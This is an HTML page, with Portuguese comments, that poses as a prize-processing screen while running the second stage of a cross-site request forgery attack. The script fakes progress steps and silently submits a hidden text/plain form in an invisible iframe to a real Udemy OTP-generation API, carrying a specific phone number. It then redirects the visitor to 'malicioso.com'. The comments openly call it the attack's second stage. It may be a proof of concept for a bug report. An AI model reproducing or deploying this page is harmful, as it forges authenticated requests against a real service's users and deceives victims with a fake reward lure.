<!DOCTYPE html>
<html>
<head>
    <title>Processando seu prêmio...</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
        h1 { color: #e53935; }
        .steps { margin-bottom: 20px; }
        .progress { height: 20px; background-color: #f3f3f3; border-radius: 10px; margin: 20px 0; }
        .progress-bar { height: 100%; width: 0; background-color: #4CAF50; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>Processando seu prêmio...</h1>
    
    <div class="steps">
        <p>✅ <strong>Passo 1:</strong> Verificação concluída</p>
        <p>✅ <strong>Passo 2:</strong> <span id="step2-text">Confirmação realizada</span></p>
        <p id="step3">⏳ <strong>Passo 3:</strong> <span id="step3-text">Registrando seu prêmio...</span></p>
    </div>
    
    <div class="progress">
        <div class="progress-bar" id="progress-bar"></div>
    </div>
    
    <script>
        // Recupera o estado do ataque
        let attackState = JSON.parse(localStorage.getItem('csrf_attack_state') || '{"started":false}');
        
        // Progresso visual
        let progress = 0;
        let progressInterval = setInterval(() => {
            progress += 1;
            document.getElementById('progress-bar').style.width = progress + '%';
            if (progress >= 100) clearInterval(progressInterval);
        }, 50);
        
        // Verifica se o ataque foi iniciado
        if (attackState && attackState.started) {
            // Atualiza o estado - estamos na fase 2
            attackState.getRequestCompleted = true;
            localStorage.setItem('csrf_attack_state', JSON.stringify(attackState));
            
            // Espera um pouco e executa o segundo estágio do ataque
            setTimeout(executePostRequest, 2000);
        }
        
        function executePostRequest() {
            // Atualiza o status visual
            document.getElementById('step3-text').textContent = "Enviando solicitação...";
            
            // SEGUNDO ESTÁGIO: Envia a requisição POST maliciosa
            // Como já fizemos uma navegação top-level GET para o site alvo,
            // os cookies da sessão estão definidos
            
            // Método 1: Usando form com enctype text/plain
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/';
            form.enctype = 'text/plain';
            
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = "phone_number";
            input.value = "{'purpose':3, 'phone_number': '+5514996810417'}";
            form.appendChild(input);
            
            // Cria um iframe oculto para o envio
            var hiddenFrame = document.createElement('iframe');
            hiddenFrame.name = 'hidden-frame';
            hiddenFrame.style.display = 'none';
            document.body.appendChild(hiddenFrame);
            
            // Define o iframe como alvo
            form.target = 'hidden-frame';
            document.body.appendChild(form);
            
            // Envia o formulário
            form.submit();
            
            // Atualiza o estado
            attackState.postRequestSent = true;
            localStorage.setItem('csrf_attack_state', JSON.stringify(attackState));
            
            // Atualiza o status visual
            setTimeout(() => {
                document.getElementById('step3').innerHTML = '✅ <strong>Passo 3:</strong> Prêmio registrado com sucesso!';
                document.getElementById('step3').style.color = '#4CAF50';
                
                // Redireciona para uma página final
                setTimeout(() => {
                    window.location.href = "https://malicioso.com/premio-confirmado.html";
                }, 1500);
            }, 1000);
        }
    </script>
</body>
</html>
